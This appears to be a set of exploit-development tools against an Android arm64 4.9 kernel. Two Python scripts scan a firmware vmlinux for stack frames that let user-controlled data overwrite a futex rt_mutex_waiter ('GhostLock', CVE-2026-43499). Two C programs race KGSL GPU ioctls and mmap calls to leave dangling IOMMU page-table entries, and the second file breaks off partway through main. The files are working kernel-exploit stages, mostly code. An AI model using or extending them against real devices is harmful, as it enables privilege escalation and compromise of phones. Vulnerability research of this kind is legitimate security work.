`tools/gl_carrier_scan.py`:

```py
#!/usr/bin/env python3
"""
gl_carrier_scan.py — GhostLock 栈覆盖载体扫描（arm64 / 本机 4.9.227 构建）

判据（交接文档 §24.10C）：
    waiter 在 do_futex+0xE8 ⇒ 以“进入内核时栈顶”为 0，其绝对位置 = -0x288，占 72 字节
    载体需把用户可控数据写到该区间 ⇒
        d = 0x110 + Σ(调用链各函数帧)
        buf_abs = -(d) + buf_off
        需要 buf_abs <= -0x288 <= buf_abs + size - 72
        ⇔ d - buf_off ∈ [0x288, 0x288 + size - 72]

用法： python tools/gl_carrier_scan.py
"""
from elftools.elf.elffile import ELFFile
from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM
from capstone.arm64 import ARM64_REG_SP, ARM64_OP_IMM

ELF = "firmware_F16/vmlinux.elf"
S_FRAME = 0x110
WAITER = 0x288
WAITER_SZ = 72
MAX_DEPTH = 3

EXTRA_ENTRIES = [
    "SyS_setsockopt", "SyS_getsockopt", "SyS_ioctl", "SyS_keyctl", "SyS_add_key",
    "SyS_sendmsg", "SyS_recvmsg", "SyS_sendto", "SyS_prctl", "SyS_getrandom",
    "SyS_pselect6", "SyS_select", "SyS_poll", "SyS_ppoll", "SyS_readv", "SyS_writev",
    "SyS_mq_timedsend", "SyS_mq_timedreceive", "SyS_socket", "SyS_bind", "SyS_connect",
    "SyS_getsockname", "SyS_futex", "SyS_ptrace", "SyS_timer_create", "SyS_clock_nanosleep",
]
COPY_PREFIX = ("__arch_copy_from_user", "__check_object_size", "arm64_memcpy_from_user")


class V:
    def __init__(self, path):
        self.fh = open(path, "rb")
        self.elf = ELFFile(self.fh)
        self.sec = [s for s in self.elf.iter_sections() if s.name == ".kernel"][0]
        self.syms = {}
        for s in self.elf.get_section_by_name(".symtab").iter_symbols():
            if s.name and s["st_info"]["type"] == "STT_FUNC":
                self.syms.setdefault(s.name, s["st_value"])
        self.by_addr = {}
        for k, val in self.syms.items():
            self.by_addr.setdefault(val, k)
        self.starts = sorted(set(self.syms.values()))
        self.md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
        self.md.detail = True
        self._frame_cache = {}

    def read(self, va, n):
        self.fh.seek(self.sec["sh_offset"] + (va - self.sec["sh_addr"]))
        return self.fh.read(n)

    def end(self, va, cap=0x8000):
        for s in self.starts:
            if s > va:
                return min(s, va + cap)
        return va + cap

    def dis(self, va):
        return list(self.md.disasm(self.read(va, self.end(va) - va), va))

    def frame(self, va):
        if va in self._frame_cache:
            return self._frame_cache[va]
        tot = 0
        for i in list(self.md.disasm(self.read(va, 0x20), va))[:6]:
            if i.mnemonic == "sub" and len(i.operands) == 3 \
               and i.operands[0].reg == ARM64_REG_SP and i.operands[2].type == ARM64_OP_IMM:
                tot += i.operands[2].imm
            elif i.mnemonic in ("stp", "str") and i.writeback and "[sp, #-" in i.op_str:
                try:
                    tot += int(i.op_str.split("[sp, #-")[1].split("]")[0], 0)
                except ValueError:
                    pass
        self._frame_cache[va] = tot
        return tot

    def callees(self, va):
        out = []
        for i in self.dis(va):
            if i.mnemonic == "bl":
                nm = self.by_addr.get(int(i.op_str.lstrip("#"), 0))
                if nm:
                    out.append(nm)
        return out

    def copies(self, va):
        ins = self.dis(va)
        hits = []
        for idx, i in enumerate(ins):
            if i.mnemonic != "bl":
                continue
            nm = self.by_addr.get(int(i.op_str.lstrip("#"), 0), "")
            if not nm.startswith(COPY_PREFIX):
                continue
            off = size = None
            for j in range(idx - 1, max(idx - 10, -1), -1):
                o = ins[j].op_str.replace(" ", "")
                if off is None and ins[j].mnemonic in ("add", "mov") and o.startswith("x0,") and "sp" in o:
                    off = int(o.split("#")[-1], 0) if "#" in o else 0
                if size is None and o.startswith("w2,#") and ins[j].mnemonic in ("mov", "movz"):
                    try:
                        size = int(o.split("#")[1], 0)
                    except (ValueError, IndexError):
                        pass
            if off is not None:
                hits.append((i.address, off, size, nm))
        return hits


def main():
    v = V(ELF)
    entries = set(EXTRA_ENTRIES)
    entries |= {n for n in v.syms if n.startswith(("SyS_", "compat_SyS_"))}
    entries = sorted(e for e in entries if e in v.syms)

    found, near, seen = [], [], set()

    def walk(name, depth, frames):
        if depth > MAX_DEPTH or name in seen:
            return
        seen.add(name)
        va = v.syms[name]
        f = v.frame(va)
        cur = frames + f
        for addr, off, size, cn in v.copies(va):
            dminus = S_FRAME + cur - off
            eff = size if size is not None else 128      # 未知长度按常见上界估计
            hi = WAITER + eff - WAITER_SZ
            rec = (name, addr, off, size, dminus, cn)
            if WAITER <= dminus <= hi:
                found.append(rec)
            elif WAITER - 0x100 <= dminus <= hi + 0x100:
                near.append(rec)
        for c in v.callees(va):
            walk(c, depth + 1, cur)

    for e in entries:
        walk(e, 0, 0)

    print(f"扫描入口 {len(entries)} 个（深度≤{MAX_DEPTH}）：命中 {len(found)}，近失配 {len(near)}\n")
    hdr = f"{'函数':26s} {'copy点':16s} {'buf_off':>8s} {'size':>6s} {'d-buf':>8s}  callee"
    if found:
        print("=== 命中：可覆盖 waiter(72B) ===")
        print(hdr)
        for r in sorted(found, key=lambda x: x[4]):
            print(f"{r[0]:26s} {r[1]:#16x} {r[2]:#8x} {str(r[3]):>6s} {r[4]:#8x}  {r[5]}")
    else:
        print("=== 命中：无 ===")
    if near:
        print("\n=== 近失配（±0x100，按接近 0x2a3 排序，前 15）===")
        print(hdr)
        for r in sorted(near, key=lambda x: abs(x[4] - 0x2A3))[:15]:
            print(f"{r[0]:26s} {r[1]:#16x} {r[2]:#8x} {str(r[3]):>6s} {r[4]:#8x}  {r[5]}")


if __name__ == "__main__":
    main()

```

`tools/gl_frame_calc.py`:

```py
#!/usr/bin/env python3
"""
gl_frame_calc.py — GhostLock(CVE-2026-43499) 栈重叠可行性计算器（arm64 / 4.9）

目的（§24.6 闸门 G1）：
  判定 futex 路径上 `rt_mutex_waiter` 的绝对栈位置，是否落在 pselect 路径
  `core_sys_select()` 的 `stack_fds`（用户可控 fd_set 位图区）之内。

输入：firmware_F16/vmlinux.elf（由 vmlinux-to-elf 从 kernel.decompressed 重建，
      符号空间已验证：stext 反汇编可读出 preserve_boot_args/el2_setup/__create_page_tables）

输出：两条路径的 SP 位移链、waiter/stack_fds 的绝对偏移、重叠判定、可用 NFDS 建议。

用法：
  python tools/gl_frame_calc.py
"""
import struct
from elftools.elf.elffile import ELFFile
from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM

ELF = "firmware_F16/vmlinux.elf"
S_FRAME = 0x110          # arm64 pt_regs（kernel_entry 的 sub sp,sp,#S_FRAME_SIZE）
WAITER_SZ = 72           # 4.9: rb_node(24)+rb_node(24)+task(8)+lock(8)+prio(4) -> 72
FDS_USER_SETS = 3        # in/out/ex 三张位图被 copy_from_user


class Vmlinux:
    def __init__(self, path):
        self.fh = open(path, "rb")
        self.elf = ELFFile(self.fh)
        self.sec = [s for s in self.elf.iter_sections() if s.name == ".kernel"][0]
        self.base = self.sec["sh_addr"]
        self.syms = {}
        self.starts = []
        symtab = self.elf.get_section_by_name(".symtab")
        for s in symtab.iter_symbols():
            if s.name and s["st_info"]["type"] == "STT_FUNC":
                self.syms.setdefault(s.name, s["st_value"])
        self.starts = sorted(self.syms.values())

    def off(self, va):
        return self.sec["sh_offset"] + (va - self.sec["sh_addr"])

    def read(self, va, n):
        self.fh.seek(self.off(va))
        return self.fh.read(n)

    def end_of(self, va, limit=0x4000):
        for s in self.starts:
            if s > va:
                return min(s, va + limit)
        return va + limit

    def dis(self, va, n=None):
        if n is None:
            n = self.end_of(va) - va
        code = self.read(va, n)
        md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
        md.detail = True
        return list(md.disasm(code, va))

    def addr(self, name):
        return self.syms.get(name)


def frame_size(insns):
    """函数入口的 SP 下移量（取前若干条 sub sp,sp,#imm / stp 预索引 的最大累计）"""
    total = 0
    for i in insns[:8]:
        if i.mnemonic == "sub" and len(i.operands) == 3:
            if i.op_str.replace(" ", "").startswith("sp,sp,#"):
                try:
                    total += int(i.op_str.split("#")[-1], 0)
                except ValueError:
                    pass
        elif i.mnemonic in ("stp", "str") and "!" in i.op_str and "[sp, #-" in i.op_str:
            try:
                total += int(i.op_str.split("[sp, #-")[1].split("]")[0], 0)
            except ValueError:
                pass
    return total


def find_calls(insns, target_names, syms):
    """返回 [(idx, 目标名 or None, 目标地址)]，含 bl/blr 与 adrp+add+blr 三连"""
    out = []
    for idx, i in enumerate(insns):
        if i.mnemonic == "bl":
            tgt = int(i.op_str.lstrip("#"), 0)
            nm = None
            for k, v in syms.items():
                if v == tgt:
                    nm = k
                    break
            out.append((idx, nm, tgt))
        elif i.mnemonic == "blr":
            # 回溯 adrp/add 组合
            reg = i.op_str.strip()
            nm = None
            for j in range(idx - 1, max(idx - 4, -1), -1):
                if insns[j].mnemonic == "add" and insns[j].op_str.startswith(reg + ", "):
                    if "sp" in insns[j].op_str:
                        break
                    nm = "<adrp+add:%s>" % insns[j].op_str
                    break
            out.append((idx, nm, None))
    return out


def prev_sp_rel(insns, idx, reg):
    """在 idx 之前找 add <reg>, sp, #imm / mov <reg>, sp，返回立即数"""
    for j in range(idx - 1, max(idx - 12, -1), -1):
        i = insns[j]
        if i.mnemonic == "add" and i.op_str.startswith(reg + ", sp"):
            try:
                return int(i.op_str.split("#")[-1], 0)
            except ValueError:
                return None
        if i.mnemonic in ("mov", "add") and i.op_str.replace(" ", "") == reg + ",sp":
            return 0
    return None


def main():
    v = Vmlinux(ELF)
    print(f"[+] base={v.base:#x}")
    report = {}

    # ---------- futex 路径 ----------
    names = ["SyS_futex", "do_futex", "rt_mutex_start_proxy_lock",
             "rt_mutex_wait_proxy_lock", "rt_mutex_cleanup_proxy_lock"]
    for n in names:
        print(f"    {n:30s} {v.addr(n) if v.addr(n) else 'ABSENT'}")

    sy = v.dis(v.addr("SyS_futex"))
    do = v.dis(v.addr("do_futex"))
    sy_f, do_f = frame_size(sy), frame_size(do)
    print(f"[+] SyS_futex  frame={sy_f:#x}  do_futex frame={do_f:#x}")

    calls = find_calls(do, names, v.syms)
    print("[+] do_futex 内可疑调用：")
    waiter_off = None
    for idx, nm, tgt in calls:
        if nm and nm.startswith("rt_mutex"):
            # rt_mutex_start_proxy_lock(lock=x0, waiter=x1, task=x2)
            rel = prev_sp_rel(do, idx, "x1")
            print(f"    {do[idx].address:#x} bl {nm}   waiter=x1 <- sp+{rel if rel is None else hex(rel)}")
            if nm == "rt_mutex_start_proxy_lock" and rel is not None:
                waiter_off = rel
        elif nm is None:
            print(f"    {do[idx].address:#x} blr {do[idx].op_str}  ({tgt and hex(tgt)})")
    report["waiter_off_in_do_futex"] = waiter_off
    report["sy_futex_frame"] = sy_f
    report["do_futex_frame"] = do_f

    # ---------- pselect 路径 ----------
    ps = v.dis(v.addr("SyS_pselect6"))
    cs = v.dis(v.addr("core_sys_select"))
    ps_f, cs_f = frame_size(ps), frame_size(cs)
    print(f"[+] SyS_pselect6 frame={ps_f:#x}  core_sys_select frame={cs_f:#x}")

    # stack_fds 的 sp 相对偏移：core_sys_select 中 bits=stack_fds 时会是 mov/add xN,sp,#imm
    fds_off = None
    cands = []
    for idx, i in enumerate(cs):
        if i.mnemonic == "add" and i.op_str.replace(" ", "").endswith(",sp,#0x0"):
            cands.append((idx, 0))
        elif i.mnemonic == "add" and ", sp, #" in i.op_str:
            try:
                cands.append((idx, int(i.op_str.split("#")[-1], 0)))
            except ValueError:
                pass
        elif i.mnemonic == "mov" and i.op_str.replace(" ", "") in ("x0,sp", "x1,sp", "x2,sp", "x8,sp"):
            cands.append((idx, 0))
    print(f"[+] core_sys_select 内 sp 相对地址候选 {len(cands)} 处：")
    for idx, imm in cands[:12]:
        print(f"    {cs[idx].address:#x}  {cs[idx].mnemonic} {cs[idx].op_str}   (sp+{imm:#x})")
    if cands:
        fds_off = min(imm for _, imm in cands)
    report["stack_fds_off"] = fds_off
    report["sy_pselect6_frame"] = ps_f
    report["core_sys_select_frame"] = cs_f

    # ---------- 汇总 ----------
    print("\n===== 汇总 =====")
    if waiter_off is None or fds_off is None:
        print("[!] 关键偏移未能确定，需人工复核（见上方候选）")
        return report

    # 绝对位置：以“进入内核时的栈顶”为 0，向下为负
    futex_abs = -(S_FRAME + sy_f + do_f + waiter_off)      # waiter 起始
    psel_abs = -(S_FRAME + ps_f + cs_f + fds_off)          # stack_fds 起始
    print(f"  futex 路径：pt_regs {S_FRAME:#x} + SyS_futex {sy_f:#x} + do_futex {do_f:#x} + waiter {waiter_off:#x}")
    print(f"    waiter 起始 = {futex_abs:#x}  … {futex_abs + WAITER_SZ:#x}")
    print(f"  pselect 路径：pt_regs {S_FRAME:#x} + SyS_pselect6 {ps_f:#x} + core_sys_select {cs_f:#x} + stack_fds {fds_off:#x}")
    print(f"    stack_fds 起始 = {psel_abs:#x}")

    max_user = 6 * 0  # placeholder
    for nfds in (64, 128, 192, 256, 320, 336):
        size = (nfds + 7) // 8
        total = 6 * size
        if total > 256:
            print(f"  NFDS={nfds}: 6*size={total} > 256 -> 走 kmalloc，不可用")
            continue
        user_len = FDS_USER_SETS * size
        b0 = psel_abs
        b1 = psel_abs + user_len
        ok = (b0 <= futex_abs) and (futex_abs + WAITER_SZ <= b1)
        word = (futex_abs - b0) // 8
        print(f"  NFDS={nfds}: size={size} 用户区=[{b0:#x},{b1:#x}) waiter=[{futex_abs:#x},{futex_abs + WAITER_SZ:#x}) "
              f"起始字={word if futex_abs >= b0 else 'N/A'} -> {'可行 ✅' if ok else '不重叠 ❌'}")
    return report


if __name__ == "__main__":
    main()

```

`tools/k3_dangling.c`:

```c
/*
 * k3_dangling.c — 判定悬垂 PTE 是否已产生（RCA 步骤 6 的最小化验证）
 *
 * 逻辑链：
 *   [1-3] 按 RCA 建立 UAF / BOGUS / PLACEHOLDER，racer 插入回绕条目并失败返回
 *   [4]   主线程 mmap OVERLAP → 期望走 arm_lpae_map_sg，命中 UAF 已有 PTE
 *         → arm_lpae_init_pte 返回 -EEXIST 但 ms.num_pte++ 仍执行
 *         → out_err 用多算的 num_pte 去 unmap → 清掉 UAF 首 PTE (0x7001ff000)
 *   [5]   GPUOBJ_FREE(UAF) → __arm_lpae_unmap 在首个清零 PTE 处提前退出
 *         → 0x7001ff000 之后的 PTE 残留（悬垂）
 *   [6]   在 0x700200000（原 UAF 内部）新建对象并 mmap：
 *         - 失败 ENOMEM → 该处仍有 PTE → 悬垂 PTE 已产生（命中）
 *         - 成功        → 无残留 → 漏洞路径未生效（未命中）
 *
 * 风险：本程序刻意走到 RCA 步骤 6，可能触发内核崩溃。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096
#define LOGPATH "/data/local/tmp/dangling.log"

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

struct kgsl_gpuobj_free {
	uint64_t flags;
	uint64_t priv;
	unsigned int id;
	unsigned int type;
	unsigned int len;
};

#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
	_IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002

#define UAF_START     0x00000007001ff000ULL
#define UAF_SIZE      0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE  0x0000000000007000ULL
#define PLACEH_START  0x0000000710204000ULL
#define PLACEH_SIZE   0x0000000000010000ULL
#define BOGUS_START   0x0000000700204000ULL
#define WRAP_SIZE     0xffffffffffefd000ULL
#define NEWMAP_ADDR   0x0000000700200000ULL /* 原 UAF 内部 */

static int fd = -1;
static int logfd = -1;

static double now_us(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1e6 + ts.tv_nsec / 1e3;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%8.1fms] %s\n", now_us() / 1000.0,
		     buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

struct race_state {
	volatile int ready;
	volatile long result;
	volatile int saved_errno;
};

static void *racer(void *arg)
{
	struct race_state *rs = (struct race_state *)arg;
	struct kgsl_map_user_mem req;

	while (!rs->ready)
		__asm__ __volatile__("" ::: "memory");
	memset(&req, 0, sizeof(req));
	req.fd = -1;
	req.len = WRAP_SIZE;
	req.hostptr = BOGUS_START;
	req.memtype = KGSL_USER_MEM_TYPE_ADDR;
	req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	errno = 0;
	rs->result = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
	rs->saved_errno = errno;
	return NULL;
}

static int alloc_obj(uint64_t size, unsigned int *id, uint64_t *ms)
{
	struct kgsl_gpuobj_alloc al;

	memset(&al, 0, sizeof(al));
	al.size = size;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al))
		return -1;
	*id = al.id;
	*ms = al.mmapsize;
	return 0;
}

int main(void)
{
	unsigned int uaf_id = 0, ov_id = 0, ph_id = 0, new_id = 0;
	uint64_t uaf_ms = 0, ov_ms = 0, ph_ms = 0, new_ms = 0;
	void *p, *bogus, *ph;
	size_t k;
	struct race_state rs;
	pthread_t th;
	struct kgsl_gpuobj_free fr;
	int e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== dangling test start pid=%d =====", getpid());
	sync_log();

	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		lg("open FAIL errno=%d", errno);
		return 1;
	}

	if (alloc_obj(UAF_SIZE, &uaf_id, &uaf_ms) ||
	    alloc_obj(OVERLAP_SIZE, &ov_id, &ov_ms)) {
		lg("alloc FAIL errno=%d", errno);
		return 1;
	}
	lg("UAF id=%u size=0x%llx / OVERLAP id=%u size=0x%llx", uaf_id,
	   (unsigned long long)uaf_ms, ov_id, (unsigned long long)ov_ms);

	p = mmap((void *)(uintptr_t)UAF_START, (size_t)uaf_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)uaf_id << 12);
	if (p == MAP_FAILED) {
		lg("UAF mmap FAIL errno=%d", errno);
		return 1;
	}
	((volatile char *)p)[0] = 1;
	((volatile char *)p)[uaf_ms - PAGE] = 1;
	for (k = 0; k + PAGE < uaf_ms; k += PAGE * 1024)
		((volatile char *)p)[k] = 1;
	munmap(p, (size_t)uaf_ms);
	lg("[1-3] UAF mmap+touch+munmap OK");

	bogus = mmap((void *)(uintptr_t)BOGUS_START, PAGE * 3,
		     PROT_READ | PROT_WRITE,
		     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (bogus == MAP_FAILED) {
		lg("BOGUS mmap FAIL errno=%d", errno);
		return 1;
	}
	for (k = 0; k < 3; k++)
		((volatile char *)bogus)[k * PAGE] = 1;

	if (alloc_obj(PLACEH_SIZE, &ph_id, &ph_ms)) {
		lg("PLACEHOLDER alloc FAIL");
		return 1;
	}
	ph = mmap((void *)(uintptr_t)PLACEH_START, (size_t)ph_ms,
		  PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		  (off_t)ph_id << 12);
	if (ph == MAP_FAILED) {
		lg("PLACEHOLDER mmap FAIL errno=%d", errno);
		return 1;
	}
	((volatile char *)ph)[0] = 1;
	lg("BOGUS VMA + PLACEHOLDER OK");

	memset(&rs, 0, sizeof(rs));
	rs.result = -1;
	pthread_create(&th, NULL, racer, &rs);
	rs.ready = 1;
	pthread_join(th, NULL);
	lg("racer 返回 ret=%ld errno=%d", rs.result, rs.saved_errno);
	sync_log();

	lg("[4] 主线程 mmap OVERLAP");
	p = mmap((void *)(uintptr_t)OVERLAP_START, (size_t)ov_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)ov_id << 12);
	e = errno;
	lg("[4] OVERLAP mmap → %s errno=%d (%s)",
	   p == MAP_FAILED ? "FAIL" : "OK", e, strerror(e));
	sync_log();

	lg("[5] GPUOBJ_FREE(UAF) —— 若首 PTE 已被清零，unmap 会提前退出留下悬垂 PTE");
	memset(&fr, 0, sizeof(fr));
	fr.id = uaf_id;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr))
		lg("[5] free FAIL errno=%d", errno);
	else
		lg("[5] free OK");
	sync_log();

	lg("[6] 在原 UAF 内部 0x%llx 新建并 mmap（判据：失败 ENOMEM = 悬垂 PTE 存在）",
	   (unsigned long long)NEWMAP_ADDR);
	if (alloc_obj(PAGE, &new_id, &new_ms) == 0) {
		void *q = mmap((void *)(uintptr_t)NEWMAP_ADDR, (size_t)new_ms,
			       PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED,
			       fd, (off_t)new_id << 12);
		e = errno;
		lg("[6] new mmap → %s errno=%d (%s)",
		   q == MAP_FAILED ? "FAIL" : "OK", e, strerror(e));
		sync_log();
		lg("---- 判定 ----");
		if (q == MAP_FAILED && e == ENOMEM)
			lg("verdict: 悬垂 PTE 已产生（该地址仍有残留 PTE）→ 漏洞路径已生效");
		else if (q != MAP_FAILED)
			lg("verdict: 无残留 PTE → 漏洞路径未生效（需重新设计触发）");
		else
			lg("verdict: 其他 errno=%d", e);
	} else {
		lg("[6] alloc FAIL errno=%d", errno);
	}

	sync_log();
	lg("===== end =====");
	sync_log();
	close(fd);
	return 0;
}
```

`tools/k3_discrim.c`:

```c
/*
 * k3_discrim.c — 判定 OVERLAP 的 rbtree 插入是否成功（区分两种 ENOMEM）
 *
 * 背景：OVERLAP mmap 失败时 errno 恒为 ENOMEM，但来源有两个：
 *   (a) kgsl_iommu_set_svm_region 检出与 UAF 冲突 → 根本没走到 map_sg（未命中）
 *   (b) 插入成功，进入 kgsl_mmu_map → arm_lpae_map_sg 命中已有 PTE → 失败（已命中漏洞路径）
 *
 * 判据：OVERLAP = [0x7001fe000, 0x700205000)，UAF = [0x7001ff000, 0x710203000)。
 *   两者唯一的非重叠部分是 **首 4 KB：[0x7001fe000, 0x7001ff000)**。
 *   在该页上再发一次 MAP_USER_MEM：
 *     - 返回 0        → 该页空闲 → OVERLAP 节点不存在 → 情况 (a)，未命中
 *     - 返回 -ENOMEM  → 该页已被 OVERLAP 节点占用 → 情况 (b)，已进入漏洞路径
 *
 * 全程无并发、无 GPU 命令；与已证实安全的 delay=3000µs 路径同构。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096
#define LOGPATH "/data/local/tmp/discrim.log"

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002

#define UAF_START     0x00000007001ff000ULL
#define UAF_SIZE      0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE  0x0000000000007000ULL
#define PLACEH_START  0x0000000710204000ULL
#define PLACEH_SIZE   0x0000000000010000ULL
#define BOGUS_START   0x0000000700204000ULL
#define WRAP_SIZE     0xffffffffffefd000ULL

/* 探针地址 */
#define PROBE_OVERLAP_ONLY 0x00000007001fe000ULL /* OVERLAP∩¬UAF，唯一可判别页 */
#define PROBE_INSIDE_UAF   0x0000000700200000ULL /* UAF 内部，对照（应恒失败） */

static int fd = -1;
static int logfd = -1;

static double now_us(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1e6 + ts.tv_nsec / 1e3;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%6.1fms] %s\n", now_us() / 1000.0,
		     buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

struct race_state {
	volatile int ready;
	volatile long result;
	volatile int saved_errno;
};

static void *racer(void *arg)
{
	struct race_state *rs = (struct race_state *)arg;
	struct kgsl_map_user_mem req;

	while (!rs->ready)
		__asm__ __volatile__("" ::: "memory");

	memset(&req, 0, sizeof(req));
	req.fd = -1;
	req.len = WRAP_SIZE;
	req.hostptr = BOGUS_START;
	req.memtype = KGSL_USER_MEM_TYPE_ADDR;
	req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	errno = 0;
	rs->result = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
	rs->saved_errno = errno;
	return NULL;
}

static int svm_probe(uint64_t addr, const char *tag, int *out_errno)
{
	struct kgsl_map_user_mem m;
	void *p;
	int ret, e;
	static int done_uaf_start = 0;
	uint64_t a = addr;

	/* PROBE_INSIDE_UAF 可能与现有 VMA 冲突：先尝试 MAP_FIXED 建页 */
	p = mmap((void *)(uintptr_t)a, PAGE, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (p == MAP_FAILED) {
		lg("%s: vma FAIL errno=%d (%s)", tag, errno, strerror(errno));
		*out_errno = errno;
		return -1;
	}
	*(volatile char *)p = 1;
	memset(&m, 0, sizeof(m));
	m.fd = -1;
	m.len = PAGE;
	m.hostptr = (unsigned long)(uintptr_t)p;
	m.memtype = KGSL_USER_MEM_TYPE_ADDR;
	m.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	errno = 0;
	ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &m);
	e = errno;
	lg("%s: MAP_USER_MEM(0x%llx) → ret=%d errno=%d (%s) out_gpuaddr=0x%lx",
	   tag, (unsigned long long)a, ret, e, strerror(e), m.gpuaddr);
	*out_errno = e;
	(void)done_uaf_start;
	munmap(p, PAGE);
	return ret;
}

int main(void)
{
	unsigned int uaf_id = 0, ov_id = 0, ph_id = 0;
	uint64_t uaf_ms = 0, ov_ms = 0, ph_ms = 0;
	void *p, *bogus, *ph;
	size_t k;
	struct kgsl_gpuobj_alloc al;
	struct race_state rs;
	pthread_t th;
	int e = 0;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== discrim start pid=%d =====", getpid());
	sync_log();

	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		lg("open FAIL errno=%d", errno);
		return 1;
	}

	/* UAF */
	memset(&al, 0, sizeof(al));
	al.size = UAF_SIZE;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al)) {
		lg("UAF alloc FAIL errno=%d", errno);
		return 1;
	}
	uaf_id = al.id;
	uaf_ms = al.mmapsize;

	/* OVERLAP */
	memset(&al, 0, sizeof(al));
	al.size = OVERLAP_SIZE;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al)) {
		lg("OVERLAP alloc FAIL errno=%d", errno);
		return 1;
	}
	ov_id = al.id;
	ov_ms = al.mmapsize;

	p = mmap((void *)(uintptr_t)UAF_START, (size_t)uaf_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)uaf_id << 12);
	if (p == MAP_FAILED) {
		lg("UAF mmap FAIL errno=%d", errno);
		return 1;
	}
	((volatile char *)p)[0] = 1;
	((volatile char *)p)[uaf_ms - PAGE] = 1;
	for (k = 0; k + PAGE < uaf_ms; k += PAGE * 1024)
		((volatile char *)p)[k] = 1;
	munmap(p, (size_t)uaf_ms);
	lg("UAF alloc/mmap/touch/munmap OK (rbtree 条目与 PTE 预期残留)");
	sync_log();

